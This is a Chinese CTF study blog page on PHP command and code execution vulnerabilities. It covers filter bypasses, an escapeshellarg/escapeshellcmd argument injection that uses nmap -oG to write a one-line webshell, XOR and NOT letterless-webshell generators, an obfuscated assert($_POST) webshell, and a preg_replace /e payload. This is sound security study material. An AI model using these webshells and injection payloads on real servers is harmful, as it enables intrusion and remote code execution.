<li><strong>解码绕过(重点)</strong><br><code>echo 编码后字符 |base64 -d |bash(或是sh)</code><br>例子:<code>echo Y2F0IGZsYWcucGhw|base64 -d|bash</code>&#x3D;<code>cat flag.php</code><br>利用管道符将解码后的命令输入到bash(或sh),这样命令才会被识别成命令执行,不然只会输出解码后的字符串</li>
</ol>
<h2 id="其他的一些绕过"><a href="#其他的一些绕过" class="headerlink" title="其他的一些绕过"></a>其他的一些绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\   //反斜线</span><br><span class="line">&quot;&quot;   //空字符串</span><br><span class="line">&#x27;&#x27;  //空字符串</span><br><span class="line">适用于过滤不严格的情况,待补充</span><br></pre></td></tr></table></figure>

<h2 id="escapeshellarg-和escapeshellcmd"><a href="#escapeshellarg-和escapeshellcmd" class="headerlink" title="escapeshellarg()和escapeshellcmd()"></a>escapeshellarg()和escapeshellcmd()</h2><p>buuctf例题连接<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[BUUCTF%202018]Online%20Tool">[BUUCTF 2018]Online Tool</a></p>
<ol>
<li><strong>escapeshellarg()</strong><br>这个函数通过将输入的内容两端添加单引号包裹,这样以确保能够直接将一个字符串传入shell函数，使原本会被理解成参数选项的部分被理解成命令内容,确保不会参数参数注入漏洞<br>如果想通过输入单引号进行闭合也是不可行的,此函数会将单引号<code>&#39;</code>进行转义后再用单引号包裹<code>&#39;\&#39;&#39;</code><br>ps:参数注入漏洞是指，在执行命令的时候，用户控制了命令中的某个参数，并通过一些危险的参数功能，达成攻击的目的。</li>
<li><strong>escapeshellcmd()</strong><br>会在这些字符(<code>&amp; # ; | * ? ~ &lt; &gt; ^ () [] &#123;&#125; $ \ , \x0A 和 \xFF 反引号 </code>)前添加反斜杠\进行转义,但单引号<code>&#39;</code>和双引号<code>&quot;</code>仅在不配对儿的时候被转义。在Windows平台上，所有这些字符加上 % 和 ! 字符都会被空格代替</li>
<li><strong>原理</strong><br>这两个函数都是用来转义用的，前者转义参数，后者转义命令 <code>escapeshellarg() -&gt; escapeshellcmd()</code>这样的流程来处理输入，会导致单引号配对错误,从而导致escapeshellarg()失效,参数参数注入漏洞<br>主要是因为第二个函数转义了第一个函数的反斜杠,贴一个别人的例子<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">传入参数是：172.17.0.2&#x27; -v -d a=1</span><br><span class="line">首先经过escapeshellarg处理后变成了&#x27;172.17.0.2&#x27;\&#x27;&#x27; -v -d a=1&#x27;，</span><br><span class="line">即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</span><br><span class="line">再经过escapeshellcmd处理后变成&#x27;172.17.0.2&#x27;\\&#x27;&#x27; -v -d a=1\&#x27;，</span><br><span class="line">这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义</span><br><span class="line">最后执行的命令是curl &#x27;172.17.0.2&#x27;\\&#x27;&#x27; -v -da=1\&#x27;，</span><br><span class="line">由于中间的\\被解释为\而不再是转义字符，所以后面的&#x27;没有被转义，与再后面的&#x27;配对儿成了一个空白连接符。</span><br><span class="line">所以可以简化为curl 172.17.0.2\ -v -d a=1&#x27;，即向172.17.0.2\发起请求，POST 数据为a=1’。</span><br></pre></td></tr></table></figure></li>
<li><strong>nmap参数注入</strong><br>nmap有个危险参数<code>-oG</code>可以将代码与命令写到文件中，<br>比如<code>nmap &lt;?php @eval($_POST[&quot;a&quot;]);?&gt; -oG shell.php</code>，就是将一句话木马写在了shell.php里内了。</li>
<li><strong>注意</strong><br>在这题中一句话木马里的参数要用双引号<code>&quot;a&quot;</code>包裹,因为escapeshellarg()会对单引号进行转义导致问题.最后的payload为<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=&#x27; &lt;?php @eval($_POST[&quot;a&quot;]);?&gt; -oG shell.php &#x27;</span><br></pre></td></tr></table></figure>
注意有两个单引号,且中间有空格,不然转义后的反斜杠会导致文件名变成<code>php\</code></li>
</ol>
<h2 id="无字母getshell"><a href="#无字母getshell" class="headerlink" title="无字母getshell"></a>无字母getshell</h2><p>代码确实是限制了我们的 Webshell 不能出现任何字母和数字，但是并没有限制除了字母和数字以外的其他字符。所以我们的思路是，将非字母数字的字符经过各种转换，最后能构造出a-z0-9中的任意一个字符。然后再利用 PHP 允许动态函数执行的特点，拼接处一个函数名，比如 “assert”、”system”、”file_put_contents”、”call_user_func” 等危险函数然后动态执行即可。<br>本质上就是对一下代码的绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230419162258.png" alt="菜鸟教程位运算"></p>
<h3 id="异或构造"><a href="#异或构造" class="headerlink" title="异或构造"></a>异或构造</h3><p>关键字符<code>^</code></p>
<ol>
<li>python脚本<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">a=[]</span><br><span class="line">ans1=<span class="string">&quot;&quot;</span></span><br><span class="line">ans2=<span class="string">&quot;&quot;</span></span><br><span class="line">myxor=<span class="string">&quot;phpinfo&quot;</span>  <span class="comment"># 想要异或编码的字符</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):  <span class="comment"># 全部字符的范围</span></span><br><span class="line">    c=<span class="built_in">chr</span>(i)</span><br><span class="line">    tmp = re.<span class="keyword">match</span>(<span class="string">r&#x27;[0-9]|[a-z]&#x27;</span>,c,re.I)  <span class="comment"># 设置过滤条件</span></span><br><span class="line">    <span class="keyword">if</span>(tmp):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 当执行正确时，那说明这些是被过滤掉的，所以才会被匹配到，此时我们让他继续执行即可</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a.append(c)</span><br><span class="line">        <span class="comment"># 在数组中加入未被系统过滤掉的字符</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">global</span> ans1  <span class="comment"># 引用全局变量ans1，使得在局部对其进行更改时不会报错</span></span><br><span class="line">    <span class="keyword">global</span> ans2  <span class="comment"># 引用全局变量ans2，使得在局部对其进行更改时不会报错</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:  <span class="comment"># 遍历未被过滤的字符</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> a:  <span class="comment"># 在上个循环的条件下遍历未被过滤的字符</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j)==<span class="built_in">ord</span>(x)):   <span class="comment"># 转化为数字进行异或比较</span></span><br><span class="line">                ans1+=i    <span class="comment"># 将每一个右边的字符储存</span></span><br><span class="line">                <span class="comment">#ans1+=&#x27;%&#x27;+hex(ord(i))[2:] 写法2</span></span><br><span class="line">                ans2+=j    <span class="comment"># 将每一个左边的字符储存</span></span><br><span class="line">                <span class="comment">#ans2+=&#x27;%&#x27;+hex(ord(j))[2:] 写法2</span></span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> myxor:   <span class="comment"># 遍历需要编码的字符</span></span><br><span class="line">    test(m)  <span class="comment"># 使用函数的原因是为了跳出多重循环</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;(&#x27;&quot;</span>+urllib.request.quote(ans1)+<span class="string">&quot;&#x27;^&#x27;&quot;</span>+urllib.request.quote(ans2)+<span class="string">&quot;&#x27;)&quot;</span>)</span><br><span class="line"><span class="comment"># urllib.request.quote()将字符串转换为URL编码</span></span><br><span class="line"><span class="comment"># print(&#x27;((&#x27;+ans1+&#x27;)^(&#x27;+ans2+&#x27;))&#x27;) 写法2</span></span><br></pre></td></tr></table></figure>

已经确定了一个异或字符oxff(可修改),异或后进行URL编码,这样在引号被过滤时也可以使用<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;phpinfo&#x27;</span>  <span class="comment">#需要异或编码的函数</span></span><br><span class="line">myhex=<span class="number">0xff</span>   <span class="comment">#其中一个十六进制数</span></span><br><span class="line">hexstr=<span class="string">&#x27;%ff&#x27;</span>   <span class="comment">#url编码后的0xff</span></span><br><span class="line">encoded_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">encoded_hex = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    encoded_str += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">hex</span>(<span class="built_in">ord</span>(i) ^ myhex)[<span class="number">2</span>:] <span class="comment">#做了一个物理切割转化成url编码</span></span><br><span class="line">    encoded_hex +=hexstr</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;((&#x27;</span>+encoded_str+<span class="string">&#x27;)^(&#x27;</span>+encoded_hex+<span class="string">&#x27;))&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
<li><strong>注意</strong><br>php的异或可以用<code>(&#39; &#39;^&#39; &#39;)</code>或是<code>(()^())</code>(<strong>写法2</strong>)的形式进行多个字符的异或,但是因为字符串不能直接异或,先转化为16进制,外面加个括号是为了拼接可变函数如<code>(phpinfo)()</code>才可以执行,但是别忘记最后的<code>;</code>不能少<br>如果括号,引号都被过滤了的话,也许可以考虑一下执行<code>&lt;?= include /flag ?&gt;</code>类似于这样来读取关键文件信息</li>
</ol>
<h3 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h3><p>过滤的不多用php脚本跑一下<br>关键字符<code>~</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;phpinfo&#x27;</span>).<span class="string">&#x27;)&#x27;</span>;  </span><br></pre></td></tr></table></figure>
<p>过滤了大部分字符,用汉字取反的一句话木马,密码<code>_</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$__</span>=[];</span><br><span class="line"><span class="variable">$_</span>=(<span class="variable">$__</span>==<span class="variable">$__</span>);</span><br><span class="line"><span class="variable">$__</span>=~(融);</span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(匆);</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>].<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(随);</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(千);</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(苦);</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$____</span>=~(~(_));</span><br><span class="line"><span class="variable">$__</span>=~(诗);</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(尘);</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(欣);</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(站);</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]);<span class="comment">//assert($_POST[_])注释记得删</span></span><br></pre></td></tr></table></figure>
<h3 id="自增绕过"><a href="#自增绕过" class="headerlink" title="自增绕过"></a>自增绕过</h3>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/04/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hearder.jpg">
      <meta itemprop="name" content="？？喵！！">
      <meta itemprop="description" content="瞄一下学过代码，写一个睡喵的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="睡猫的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">命令执行与代码执行漏洞</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-04-15 10:21:24" itemprop="dateCreated datePublished" datetime="2023-04-15T10:21:24+08:00">2023-04-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-04-23 22:18:27" itemprop="dateModified" datetime="2023-04-23T22:18:27+08:00">2023-04-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Hacker/" itemprop="url" rel="index"><span itemprop="name">Hacker</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>5.1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>18 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h1><p><strong>原理</strong>:开发者为了实现网站的一些特殊功能时(比如ping命令)需要使用一些特殊函数,这些函数可以执行系统命令,如果没有进行严格的过滤,那么用户就可以通过这个函数实现一些危险的命令,或者加入一些危险的参数,从而获取信息</p>
<h2 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h2><p>这些函数如果可以被用户注入命令,就会带来危险性,写了个大概意思,具体参考<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/index.php">php文档</a></p>
<h3 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><ol>
<li><strong>作用</strong>:<br>执行外部程序，并且显示输出<br>system()函数用于向操作系统传递控制台命令行，以Windows系统为例，通过system()函数执行命令和在cmd窗口中执行命令的效果是一样的</li>
<li><strong>注意</strong><br>命令必须是字符串的形式</li>
</ol>
<h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><p>与system()类似,执行系统命令,返回最后一行数据,但不显示输出</p>
<h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h3><p>通过shell执行命令,返回全部数据,但不显示输出,这个函数等同于执行运算符(反引号)</p>
<h3 id="96-96-反引号"><a href="#96-96-反引号" class="headerlink" title="&#96;&#96;(反引号)"></a>&#96;&#96;(反引号)</h3><p>在php中称之为执行运算符，PHP将尝试将反引号中的内容作为shell命令来执行，并返回数据</p>
<h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h3><p>passthru直接将结果输出到浏览器，不返回数据，且其可以输出二进制，比如图像数据。</p>
<h3 id="popen-command-mode"><a href="#popen-command-mode" class="headerlink" title="popen(command,mode)"></a>popen(command,mode)</h3><p>打开进程文件指针<br>函数需要两个参数，执行命令:<code>command</code>，文件的连接模式:<code>mode</code>，有r和w代表读和写。<br>函数会执行command命令,但不会返回执行结果，而是返回一个文件指针,想要去获取命令执行的结果,就类似于操作文件去获取</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&quot;whoami&quot;</span>,<span class="string">&quot;r&quot;</span>);  <span class="comment">//popen打开一个进程通道,类似于$fp=fopen(),命令结果在这个文件里  </span></span><br><span class="line">    <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;      <span class="comment">//判断是否到EOF  </span></span><br><span class="line">        <span class="variable">$out</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>);   <span class="comment">//将命令的结果逐行遍历</span></span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$out</span>;         <span class="comment">//打印出结果  </span></span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);  <span class="comment">//关闭通道,类似于关闭文件</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<h3 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h3><p>执行一个命令，并且打开用来输入&#x2F;输出的文件指针。<br>类似popen()函数，但是proc_open()提供了更加强大的控制程序执行的能力。</p>
<h3 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h3><p>在当前进程空间执行指定程序</p>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ol start="0">
<li><strong>cat</strong><br>命令用于连接文件并打印到标准输出设备上,可以知道文件内容,但是经常被过滤吧</li>
<li><strong>cd</strong>：切换当前工作目录；<br>用法：cd 后面加目录</li>
<li><strong>ls</strong>：显示指定工作目录下的内容；<br>用法：ls 文件或路径</li>
<li><strong>cp</strong>：拷贝文件；<br>用法：cp 要复制的文件 目标路径&#x2F;新的名字</li>
<li><strong>echo</strong>：输出<br>用法：输入什么就打印什么,可以配合管道符<code>|</code>使用,也可以配合反引号内联执行<br><code>echo &gt; 1.txt</code> 将输出的内容重定向到文件中,表示覆盖后写入<br><code>echo &gt;&gt; 1.txt</code>：将输出的内容重定向到文件中,表示追加写入</li>
<li>**find [path] [expression]**：<br>查找指定文件；用法：find 目录 -name 文件<br><code>path</code>是要查找的目录路径，可以是一个目录或文件名，也可以是多个路径，如果未指定路径，则默认为当前目录<br><code>expression</code> 是可选参数，用于指定查找的条件，可以是文件名、文件类型、文件大小等等。<br>例如:<code>find /home -name “*.txt”</code><br>查找&#x2F;home目录下，所有以.txt 结尾的文件或者目录<br><code>-name</code>:是按文件名查找，支持使用通配符 * 和 ?。</li>
<li><strong>pwd</strong>：<br>显示当前所在的目录</li>
<li><strong>more</strong>:<br>命令类似cat，不过会以一页一页的形式显示</li>
<li><strong>less</strong>:<br>与<code>more</code>类似</li>
<li><strong>head</strong>:<br>查看头几行</li>
<li><strong>tac</strong>:<br>从最后一行开始显示，可以看出 tac 是 cat 的反向显示(是从最后一行输出,不是每一行逆序输出)</li>
<li><strong>tail</strong>:<br>查看尾几行</li>
<li><strong>nl</strong>：<br>可以显示出文件内容的，而且输出行号</li>
<li><strong>od</strong>:<br>od指令会读取所给予的文件的内容，并将其内容以八进制字码呈现出来,八进制三个为一组<br>使用<code>od -c</code>可以使内容以原本的形式显示</li>
<li><strong>vi</strong>:<br>文本编辑器，这个也可以查看</li>
<li><strong>vim</strong>:<br>Vim是从vi发展出来的一个文本编辑器，这个也可以查看<br><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-vim.html">可以去菜鸟教程详细学习</a></li>
<li><strong>sort</strong>:<br>sort可针对文本文件的内容，以行为单位来排序,可以查看文件</li>
<li><strong>uniq</strong>:<br>uniq 可检查文本文件中重复出现的行列,可以查看文件,但是重复内容只会显示一个</li>
<li><strong>file -f</strong>:<br>会将文件内容以报错的形式显示出来</li>
<li><strong>grep</strong>:<br>用于查找文件里符合条件的字符串或正则表达式,并打印匹配的行：<br>例如:<br><code>grep a 1.txt</code>  在文件1.txt中查找字符”a”，并打印匹配的行：<br><code>grep test *txt</code> 表示在当前目录中,包含<code>test</code>字符串的txt文件,，并打印出该字符串的行。</li>
</ol>
<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>cd：切换目录<br>D:：跳转到其他硬盘<br>ping：测试IP<br>ipconfig：查看网络详情，类似于linux的ifconfig<br>dir：显示目录中的文件内容，类似于linux的ls<br>type：查看文件，类似于linux的cat、less、more；用法：type 文件名<br>md：创建文件夹，类似于linux的mkdir；用法：md 目录名<br>tree：查看目录结构<br>copy：复制文本文件；用法：copy 文件1 文件2<br>注：<br>参数&#x2F;b指定以二进制格式复制、合并文件，用于图像类&#x2F;声音类文件<br>参数&#x2F;a指定以ASCII格式复制、合并文件，用于txt等文档类文件<br>net start 服务名；net stop 服务名<br>cls：清空cmd命令行，类似于linux的clear<br>ctrl+C：结束或退出cmd正在执行的脚本<br>find：查找<br>find &#x2F;c “所要搜索的文件所包含的字符串” 文件的绝对路径<br>for：对一个或一组文件，字符串或命令结果中的每一个对象执行特定命令<br>（1）找出C盘下的所有文件，并将所有文件名都输出出来<br>for &#x2F;r C: %i in (<em>) do @echo %i<br>（2）找出C盘下所有后缀是.txt的文件，并将其输出<br>for &#x2F;r C: %i in (</em>.txt) do @echo %i<br>（3）找出C盘下所有后缀是.txt和.jpg的文件，并将其输出<br>for &#x2F;r C: %i in (<em>.txt,</em>.jpg) do @echo %i</p>
<h2 id="命令分隔符-连接符"><a href="#命令分隔符-连接符" class="headerlink" title="命令分隔符(连接符)"></a>命令分隔符(连接符)</h2><p>命令分隔符,就是用来分隔命令的,在两句命令中加入不同的符号,效果也不相同,在Windows和Linux两种不同的操作系统中也略有区别<br>我们主要用分割符来拼接语句,所以,我们更关心后面的语句能否执行</p>
<ol>
<li><code>|</code><br>在Windows中,会直接执行后面的语句,但如果前段语句为假,则后面的语句也无法执行<br>在Linux中,是作为管道符，管道符左边命令的输出就会作为管道符右边命令的输入,无论前面真假,显示后面的执行结果</li>
<li><code>&amp;</code><br>无论前面的语句的真假,后面的语句都可以执行</li>
<li><code>&amp;&amp;</code><br>前面为假,则后面不执行</li>
<li><code>||</code><br>前面为真,则后面不执行</li>
<li><code>;</code>分号<br>Linux特有的命令连接,前面执行完前面的语句再执行后面的,也就是说,无论前面的真假,后面都会执行</li>
</ol>
<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><ol>
<li><strong>作用</strong><br>通配符用来模糊搜索文件。当<strong>不知道真正字符</strong>或者懒得输入完整名字时，常常使用通配符代替一个或多个真正的字符,或者在ctf中,关键字被过滤,也可以用通配符来替代</li>
<li><code>?</code>	<br>匹配<strong>一个</strong>任意字符,如<code>fl?g</code>可以匹配成<code>flag</code>,<code>flbg</code>等</li>
<li><code>*</code>	<br>匹配0个或<strong>多个</strong>任意字符，也就是可以匹配任意内容,如<code>f*g</code>,匹配成以f开头,g结尾的所有字符</li>
<li><code>[]</code><br>Linux里有这个通配符,而Windows没有<br>匹配<strong>括号中指定</strong>的任意<strong>一个</strong>字符,如<code>fl[abc]g</code>可以匹配到<code>flag</code>,<code>flbg</code>,<code>flcg</code><br><strong>扩展</strong>:<br>[-]	匹配括号中范围内的任意一个字符，如<code>a-c</code>代表范围a到c<br>[^]	逻辑非，表示匹配不是括号内的一个字符</li>
<li><strong>注意</strong><br>反斜杠<code>\</code>或单引号<code>&#39;</code>双引号<code>&quot;</code>都会使通配符失效。<br>如: <code>\*</code>, <code>&quot;*&quot;</code>, <code>&#39;*&#39;</code>都表示<code>*</code>本身，不通配任何文件。</li>
</ol>
<h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><h2 id="危险函数-1"><a href="#危险函数-1" class="headerlink" title="危险函数"></a>危险函数</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><p>严格来说,php中eval()不是函数,而是一个语言结构,所以无法变量函数(可变函数)函数的方式调用.<br>效果:将括号内的作为php代码执行.<br><a target="_blank" rel="noopener" href="https://shuimao.xyz/2023/03/13/PHP%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/#%E5%87%BD%E6%95%B0">变量函数参考</a></p>
<h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h3><p>如果括号内是字符串将会当成php代码执行<br>注意:在php7.2之前,assert()是一个函数,可以使用变量(可变)函数调用.在此之后assert也同eval,是语言解构而不是函数.</p>
<h3 id="preg-replace-参1-参2-参3-x2F-e"><a href="#preg-replace-参1-参2-参3-x2F-e" class="headerlink" title="preg_replace(参1,参2,参3)+&#x2F;e"></a>preg_replace(参1,参2,参3)+&#x2F;e</h3><p>执行一个正则表达式的搜索和替换,注意,php7.0之后,不再支持&#x2F;e模式</p>
<ol>
<li><strong>效果</strong>:<br>搜索参数3中是否有参数1,如果有则用参数2进行替换</li>
<li><strong>&#x2F;e模式</strong>:<br>&#x2F;e模式下,可能会导致代码执行漏洞,将参数1写成<code>/参数1/e</code>的形式,如果发生了替换,参数2就会被当成php代码,最后替换成代码执行后的结果<br>例如:<code>preg_replace($_GET[a],$_GET[b],$_GET[c])</code><br>payload:<code>?a=/hello/e&amp;b=phpinfo()&amp;c=hello world</code>  &#x2F;&#x2F;替换时会执行phpinfo</li>
</ol>
<h3 id="create-function-参1-参2"><a href="#create-function-参1-参2" class="headerlink" title="create_function(参1,参2)"></a>create_function(参1,参2)</h3><ol>
<li><strong>函数作用</strong><br>根据传递的参数创建匿名函数，并为其返回唯一名称。参1声明函数的变量部分,参2是执行的方法代码部分<br>简单来说,这个函数就是类似于function一个函数,函数1就是这个函数里面的变量,参数二的部分会被当做function函数内的代码执行</li>
